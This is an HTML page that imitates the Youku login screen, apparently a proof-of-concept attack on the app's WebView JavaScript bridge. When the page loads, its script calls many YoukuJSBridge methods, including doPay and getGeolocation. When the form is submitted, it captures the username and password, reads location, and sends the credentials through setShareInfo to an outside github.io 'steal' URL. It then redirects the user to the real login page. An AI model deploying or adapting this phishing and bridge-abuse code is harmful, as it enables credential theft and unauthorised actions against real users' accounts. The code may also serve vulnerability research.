<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>优酷视频 - 登录</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #0066cc 0%, #0055aa 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo h1 {
      color: #0066cc;
      font-size: 28px;
      font-weight: bold;
    }
    .logo p {
      color: #999;
      margin-top: 10px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      color: #333;
      margin-bottom: 8px;
      font-weight: 500;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #0066cc;
    }
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .submit-btn:hover {
      background: #0055aa;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #999;
      font-size: 12px;
    }
    .loading {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .loading.show {
      display: block;
    }
    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0066cc;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .success {
      display: none;
      text-align: center;
      color: #00cc00;
      margin-top: 20px;
    }
    .success.show {
      display: block;
    }
    .info-box {
      background: #f0f0f0;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
      font-size: 11px;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 200px;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <h1>YOUKU</h1>
      <p>优酷视频 - 账号登录</p>
    </div>
     
    <form id="loginForm">
      <div class="form-group">
        <label for="username">手机号/邮箱</label>
        <input type="text" id="username" name="username" required 
            placeholder="请输入手机号或邮箱" autocomplete="off"/>
      </div>
       
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" required 
            placeholder="请输入密码" autocomplete="off"/>
      </div>
       
      <button type="submit" class="submit-btn">登录</button>
    </form>
     
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <p style="margin-top: 10px; color: #999;">登录中...</p>
    </div>
     
    <div class="success" id="success">
      <p>✅ 登录成功！</p>
      <p style="font-size: 12px; color: #999; margin-top: 5px;">正在跳转...</p>
    </div>
     
    <div class="info-box" id="infoBox"></div>
     
    <div class="footer">
      <p>protected by 优酷安全登录</p>
    </div>
  </div>
   
  <script>
    // 显示信息
    function showInfo(msg) {
      document.getElementById('infoBox').innerHTML = msg;
    }
    
    // 调用 YoukuJSBridge 方法（Java 对象桥接）
    function callJSBridge(method, params) {
      try {
        // Java 对象的方法调用方式
        if (typeof YoukuJSBridge === 'object') {
          // 尝试直接调用
          return YoukuJSBridge[method](params);
        }
        // 尝试作为函数调用
        else if (typeof YoukuJSBridge === 'function') {
          return YoukuJSBridge(method, params);
        }
      } catch (e) {
        return 'Error: ' + e;
      }
      return 'Not available';
    }
    
    // 页面加载完成检测
    window.onload = function() {
      var info = '[*] 页面加载完成\n';
      info += '[*] YoukuJSBridge 类型：' + typeof YoukuJSBridge + '\n';
      
      if (typeof YoukuJSBridge !== 'undefined') {
        info += '\n[+] YoukuJSBridge 存在！\n';
        info += '[*] 尝试调用方法...\n\n';
        
        // 测试已知方法（Java 对象桥接）
        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
                           'setShareInfo', 'showLoginView', 'addItem2Cart', 
                           'oneKeyAddCart', 'closeActivity', 'setTitleBar',
                           'notifyVipChanged', 'startDiagnose', 'checkAPK',
                           'addTaoKeItem2Cart', 'showOrderWithSKU', 'showTaoKeOrderWithSKU',
                           'showUploadVideoPage', 'showShareView', 'addCollectionVideo',
                           'b', 'a'];
        
        var successCount = 0;
        var failCount = 0;
        
        for (var i = 0; i < knownMethods.length; i++) {
          var method = knownMethods[i];
          try {
            // 尝试调用
            var result = YoukuJSBridge[method]('{"test":true}');
            info += '[+] ' + method + ': 成功\n';
            info += '    返回值：' + result + '\n\n';
            successCount++;
          } catch (e) {
            // 不调用 showLoginView 等会改变 UI 的方法
            if (['showLoginView', 'closeActivity'].indexOf(method) === -1) {
              info += '[-] ' + method + ': 失败\n';
              info += '    错误：' + e.message + '\n\n';
              failCount++;
            }
          }
        }
        
        info += '\n================================\n';
        info += '成功：' + successCount + ' 个\n';
        info += '失败：' + failCount + ' 个\n';
        info += '================================\n';
      } else {
        info += '\n[-] YoukuJSBridge 不存在';
      }
      
      showInfo(info);
    };
     
    // 窃取凭证
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
       
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
       
      // 显示加载动画
      document.getElementById('loading').classList.add('show');
       
      // 显示捕获到凭证
      alert('[*] 捕获到凭证:\n用户名：' + username + '\n密码：' + password);
       
      // 尝试调用 YoukuJSBridge（如果在 WebView 中）
      if (typeof YoukuJSBridge !== 'undefined') {
        alert('[+] YoukuJSBridge 可用！');
         
        // 尝试获取地理位置
        try {
          var location = YoukuJSBridge.getGeolocation('{}');
          alert('[+] 获取到位置：' + location);
        } catch (err) {
          alert('[-] 位置获取失败：' + err.message);
        }
         
        // 测试所有已知方法
        var testResults = [];
        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
                           'setShareInfo', 'addItem2Cart', 'oneKeyAddCart', 
                           'setTitleBar', 'notifyVipChanged', 'startDiagnose'];
        
        for (var i = 0; i < knownMethods.length; i++) {
          var method = knownMethods[i];
          try {
            var result = YoukuJSBridge[method]('{"test":true}');
            testResults.push('[+] ' + method + ': 成功\n返回值：' + result);
          } catch (err) {
            testResults.push('[-] ' + method + ': 失败\n错误：' + err.message);
          }
        }
        
        alert('方法测试结果:\n\n' + testResults.join('\n\n'));
         
        // 尝试通过 JSBridge 发送
        try {
          var stealData = {
            username: username,
            password: password,
            timestamp: Date.now()
          };
           
          YoukuJSBridge.setShareInfo(JSON.stringify({
            title: '窃取成功',
            description: JSON.stringify(stealData),
            url: 'https://useryayagit.github.io/qinxuan/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
          }));
          alert('[+] 数据已发送到：https://useryayagit.github.io/qinxuan/');
        } catch (err) {
          alert('[-] 发送失败：' + err.message);
        }
         
        // 显示窃取成功
        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
         
        // 3 秒后跳转
        setTimeout(function() {
          try {
            YoukuJSBridge.loadUrl('{"url":"https://www.youku.com/login"}');
          } catch (err) {
            window.location.href = 'https://www.youku.com/login';
          }
        }, 3000);
         
      } else {
        alert('[-] YoukuJSBridge 不可用');
         
        // 直接显示窃取成功
        var stealData = {
          username: username,
          password: password,
          timestamp: Date.now()
        };
        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
         
        // 3 秒后跳转
        setTimeout(function() {
          window.location.href = 'https://www.youku.com/login';
        }, 3000);
      }
    });
  </script>
</body>
</html>
